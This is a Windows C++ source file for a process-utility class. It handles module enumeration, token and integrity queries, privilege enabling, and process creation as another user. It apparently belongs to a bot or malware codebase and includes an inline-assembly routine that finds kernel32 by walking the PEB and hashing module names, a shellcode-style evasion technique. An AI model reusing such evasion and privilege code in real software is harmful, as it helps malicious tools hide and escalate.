#include <WTypes.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#include "defines.h"
#include "mem.h"
#include "str.h"
#include "process.h"
#include "winsecurity.h"

void Process::init(void)
{

}

void Process::uninit(void)
{

}

HMODULE ASM_INTERNAL_DEF Process::_getKernel32Handle(void)
{
#if defined _WIN64
	return findKernel32Dll(); 
#else  
	__asm
	{
		cld                    //clear the direction flag for the loop

			mov edx, fs:[0x30]     //get a pointer to the PEB
		mov edx, [edx + 0x0C]  //get PEB->Ldr
		mov edx, [edx + 0x14]  //get the first module from the InMemoryOrder module list

next_mod:
		mov esi, [edx + 0x28]  //get pointer to modules name (unicode string)
		mov ecx, 24            //the length we want to check
			xor edi, edi           //clear edi which will store the hash of the module name

loop_modname:
		xor eax, eax           //clear eax
			lodsb                  //read in the next byte of the name
			cmp al, 'a'            //some versions of Windows use lower case module names
			jl not_lowercase
			sub al, 0x20           //if so normalise to uppercase

not_lowercase:
		ror edi, 13            //rotate right our hash value
			add edi, eax           //add the next byte of the name to the hash
			loop loop_modname      //loop until we have read enough

			cmp edi, 0x6A4ABC5B    //compare the hash with that of KERNEL32.DLL
			mov eax, [edx + 0x10]  //get this modules base address
		mov edx, [edx]         //get the next module
		jne next_mod           //if it doesn't match, process the next module
	};
#endif
}
HMODULE Process::_getModuleHandle(HANDLE process, LPWSTR moduleName)
{
	bool relative = (CWA(shlwapi, PathIsRelativeW)(moduleName) == TRUE);
	HMODULE testModule;
	HMODULE ret = NULL;
	DWORD neededSize;

	if(CWA(psapi, EnumProcessModules)(process, &testModule, sizeof(testModule), &neededSize))
	{
		HMODULE *modules = (HMODULE *)Mem::alloc(neededSize);
		if(modules)
		{
			DWORD modulesCount = neededSize / sizeof(HMODULE);
			if(CWA(psapi, EnumProcessModules)(process, modules, neededSize, &neededSize))
			{
				WCHAR name[MAX_PATH];
				for(DWORD i = 0; i < modulesCount; i++)
				{
					if(relative)
					{
						if(CWA(psapi, GetModuleBaseNameW)(process, modules[i], name, (sizeof(name) / sizeof(WCHAR))) == 0)continue;
					}
					else
					{
						if(CWA(psapi, GetModuleFileNameExW)(process, modules[i], name, (sizeof(name) / sizeof(WCHAR))) == 0)continue;
					}

#         if defined(WDEBUG1)
					WDEBUG1(WDDT_INFO, "Module: %s", name);
#         endif
					if(CWA(kernel32, lstrcmpiW)(name, moduleName) == 0)
					{
						ret = modules[i];
						break;
					}
				}
			}

			Mem::free(modules);
		}
	}
	return ret;
}

TOKEN_USER *Process::_getUserByProcessHandle(HANDLE process, LPDWORD sessionId)
{
	TOKEN_USER *tu = NULL;
	HANDLE token;
	DWORD size;

	if(CWA(advapi32, OpenProcessToken)(process, TOKEN_QUERY, &token) != FALSE)
	{
		if((tu = WinSecurity::_getUserByToken(token)) != NULL)
		{
			if(sessionId != NULL && CWA(advapi32, GetTokenInformation)(token, TokenSessionId, sessionId, sizeof(DWORD), &size) == FALSE)
			{
				Mem::free(tu);
				tu = NULL;
			}
		}
		CWA(kernel32, CloseHandle)(token);
	}

	return tu;
}

TOKEN_USER *Process::_getUserByProcessId(DWORD id, LPDWORD sessionId)
{
	TOKEN_USER *tu = NULL;
	HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, id);

	if(process != NULL)
	{
		tu = _getUserByProcessHandle(process, sessionId);
		CWA(kernel32, CloseHandle)(process);
	}

	return tu;  
}

DWORD Process::_getCountOfThreadsByProcessId(DWORD id)
{
	//FIXME: Find a faster way.
	HANDLE snapshot = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, 0);
	if(snapshot != INVALID_HANDLE_VALUE)
	{
		DWORD count = 0;
		THREADENTRY32 te;
		te.dwSize = sizeof(THREADENTRY32);

		if(CWA(kernel32, Thread32First)(snapshot, &te) != FALSE)
		{
			do
			{
				if(te.th32OwnerProcessID == id)count++;
			}
			while(CWA(kernel32, Thread32Next)(snapshot, &te) != FALSE);
		}

		CWA(kernel32, CloseHandle)(snapshot);
		return count;
	}

	return (DWORD)-1;
}

bool Process::_enablePrivilege(LPWSTR privilegeName, bool enable)
{
	HANDLE token;

	if(CWA(advapi32, OpenThreadToken)(CWA(kernel32, GetCurrentThread)(), TOKEN_ADJUST_PRIVILEGES/* | TOKEN_QUERY*/, FALSE, &token) == FALSE)
	{
		if(CWA(advapi32, OpenProcessToken)(CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES/* | TOKEN_QUERY*/, &token) == FALSE)
		{
			return false;
		}
	}

	bool r = false;
	TOKEN_PRIVILEGES tp;

	tp.PrivilegeCount           = 1;
	tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

	if(CWA(advapi32, LookupPrivilegeValueW)(NULL, privilegeName, &tp.Privileges[0].Luid) != FALSE &&
		CWA(advapi32, AdjustTokenPrivileges)(token, FALSE, &tp, 0, NULL, NULL) != FALSE &&
		CWA(kernel32, GetLastError)() == ERROR_SUCCESS)
	{
		r = true;
	}

	CWA(kernel32, CloseHandle)(token);

	return r;
}

BYTE Process::_getIntegrityLevel(HANDLE process)
{
	BYTE retVal = INTEGRITY_UNKNOWN;
	HANDLE token;
	if(CWA(advapi32, OpenProcessToken)(process, TOKEN_QUERY, &token) != FALSE)
	{
		DWORD size;
		if(CWA(advapi32, GetTokenInformation)(token, TokenIntegrityLevel, NULL, 0, &size) == FALSE && CWA(kernel32, GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
		{
			PTOKEN_MANDATORY_LABEL tml = (PTOKEN_MANDATORY_LABEL)Mem::alloc(size);
			if(tml != NULL)
			{
				if(CWA(advapi32, GetTokenInformation)(token, TokenIntegrityLevel, tml, size, &size) != FALSE)
				{
					PUCHAR count = CWA(advapi32, GetSidSubAuthorityCount)(tml->Label.Sid);
					if(count != NULL && *count > 0)
					{
						LPDWORD integrityLevel = CWA(advapi32, GetSidSubAuthority)(tml->Label.Sid, (DWORD)((*count) - 1));
						if(integrityLevel != NULL)
						{
							DWORD level = *integrityLevel;
							if(level < SECURITY_MANDATORY_MEDIUM_RID)retVal = INTEGRITY_LOW;
							else if(level >= SECURITY_MANDATORY_MEDIUM_RID && level < SECURITY_MANDATORY_HIGH_RID)retVal = INTEGRITY_MEDIUM;
							else if(level >= SECURITY_MANDATORY_HIGH_RID)retVal = INTEGRITY_HIGH;
						}
					}
				}
				Mem::free(tml);
			}
		}
		CWA(kernel32, CloseHandle)(token);
	}
	return retVal;
}

#if !defined _WIN64
bool Process::_isWow64(HANDLE process)
{
	typedef BOOL (WINAPI *ISWOW64PROCESS)(HANDLE, PBOOL);

	BOOL isWow64 = FALSE;

	HMODULE kernel32 = CWA(kernel32, GetModuleHandleW)(L"kernel32.dll");
	if(kernel32 != NULL)
	{
		ISWOW64PROCESS isWow64Process = (ISWOW64PROCESS)CWA(kernel32, GetProcAddress)(kernel32, "IsWow64Process");
		if(isWow64Process != NULL)
		{
			if(isWow64Process(process, &isWow64) == FALSE)return false;
		}
	}

	return isWow64 ? true : false;
}
#endif

DWORD Process::_create(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
{
	//The Unicode version of this function, CreateProcessW, can modify the contents of this string.
	WCHAR zeroStr[1];
	zeroStr[0] = 0;

	{
		STARTUPINFOW defaultStartupInfo;
		PROCESS_INFORMATION info;

		if(starupInfo == NULL)
		{
			Mem::_zero(&defaultStartupInfo, sizeof(STARTUPINFOW));
			defaultStartupInfo.cb = sizeof(STARTUPINFOW);
		}

#   if defined WDEBUG2
		WDEBUG2(WDDT_INFO, "module=[%s], commandLine=[%s]", module, commandLine);
#   endif

		if(CWA(kernel32, CreateProcessW)(module,
			commandLine == NULL ? zeroStr : commandLine,
			NULL,
			NULL,
			FALSE,
			CREATE_DEFAULT_ERROR_MODE,
			NULL,
			workDir,
			starupInfo == NULL ? &defaultStartupInfo : (STARTUPINFOW *)starupInfo,
			&info
			) != FALSE)
		{
			if(pi != NULL)
			{
				Mem::_copy(pi, &info, sizeof(PROCESS_INFORMATION));
			}
			else
			{
				CWA(kernel32, CloseHandle)(info.hThread);
				CWA(kernel32, CloseHandle)(info.hProcess);
			}

			return info.dwProcessId;
		}
#   if defined WDEBUG0 && BO_DEBUG > 0
		else WDEBUG0(WDDT_ERROR, "Failed.");
#   endif
	}
	return 0;
}

DWORD Process::_createEx(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
{
	DWORD pid = 0;
	LPWSTR realCommandLine;

	int r;
	if(commandLine == NULL)r = Str::_sprintfExW(&realCommandLine, L"\"%s\"", module);
	else r = Str::_sprintfExW(&realCommandLine, L"\"%s\" %s", module, commandLine);

	if(r > 0)
	{
		pid = _create(NULL, realCommandLine, workDir, starupInfo, pi);
		Mem::free(realCommandLine);
	}
	return pid;
}

DWORD Process::_createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
{
	typedef BOOL (WINAPI *CREATEENVIRONMENTBLOCK)(LPVOID *environment, HANDLE token, BOOL inherit);
	typedef BOOL (WINAPI *DESTROYENVIRONMENTBLOCK)(LPVOID environment);

# if defined WDEBUG2
	WDEBUG2(WDDT_INFO, "module=[%s], commandLine=[%s]", module, commandLine);
# endif

	bool retVal = 0;
	HMODULE dll = CWA(kernel32, LoadLibraryA)("userenv.dll");
	if(dll != NULL)
	{
		CREATEENVIRONMENTBLOCK createEnvironmentBlock   = (CREATEENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "CreateEnvironmentBlock");
		DESTROYENVIRONMENTBLOCK destroyEnvironmentBlock = (DESTROYENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "DestroyEnvironmentBlock");
		if(createEnvironmentBlock != NULL && destroyEnvironmentBlock != NULL)
		{
			//Create an environment variable.
			void *environment = NULL;
			if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //Параноя.

			//Create a process, complete analog to create().
			{
				WCHAR zeroStr[1];
				zeroStr[0] = 0;

				{
					STARTUPINFOW defaultStartupInfo;
					PROCESS_INFORMATION info;

					if(starupInfo == NULL)
					{
						Mem::_zero(&defaultStartupInfo, sizeof(STARTUPINFOW));
						defaultStartupInfo.cb        = sizeof(STARTUPINFOW);
						defaultStartupInfo.lpDesktop = (LPWSTR)desktop;
					}

					if(CWA(advapi32, CreateProcessAsUserW)(token,
						module,
						commandLine == NULL ? zeroStr : commandLine,
						NULL,
						NULL,
						FALSE,
						CREATE_DEFAULT_ERROR_MODE | (environment == NULL ? 0 : CREATE_UNICODE_ENVIRONMENT),
						environment,
						workDir,
						starupInfo == NULL ? &defaultStartupInfo : (STARTUPINFOW *)starupInfo,
						&info
						) != FALSE)
					{
						if(pi != NULL)
						{
							Mem::_copy(pi, &info, sizeof(PROCESS_INFORMATION));
						}
						else
						{
							CWA(kernel32, CloseHandle)(info.hThread);
							CWA(kernel32, CloseHandle)(info.hProcess);
						}

						retVal = info.dwProcessId;
					}
				}
			}

			if(environment != NULL)destroyEnvironmentBlock(environment);
		}

		CWA(kernel32, FreeLibrary)(dll);
	}

# if defined WDEBUG0 && BO_DEBUG > 0
	if(retVal == 0)WDEBUG0(WDDT_ERROR, "Failed.");
# endif

	return retVal;
}

DWORD Process::_createAsUserEx(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
{
	DWORD pid = 0;
	LPWSTR realCommandLine;

	int r;
	if(commandLine == NULL)r = Str::_sprintfExW(&realCommandLine, L"\"%s\"", module);
	else r = Str::_sprintfExW(&realCommandLine, L"\"%s\" %s", module, commandLine);

	if(r > 0)
	{
		pid = _createAsUser(token, desktop, NULL, realCommandLine, workDir, starupInfo, pi);
		Mem::free(realCommandLine);
	}
	return pid;
}

void Process::_closeProcessInformation(PROCESS_INFORMATION *pi)
{
	if(pi->hThread != NULL)CWA(kernel32, CloseHandle)(pi->hThread);
	if(pi->hProcess != NULL)CWA(kernel32, CloseHandle)(pi->hProcess);
	Mem::_zero(pi, sizeof(PROCESS_INFORMATION));
}

DWORD Process::_createThread(SIZE_T stackSize, LPTHREAD_START_ROUTINE startAddress, LPVOID parameter)
{
	DWORD id;
	HANDLE thread = CWA(kernel32, CreateThread)(NULL, stackSize, startAddress, parameter, 0, &id);
	if(thread != NULL)
	{
		CWA(kernel32, CloseHandle)(thread);
		return id;
	}

	return 0;
}

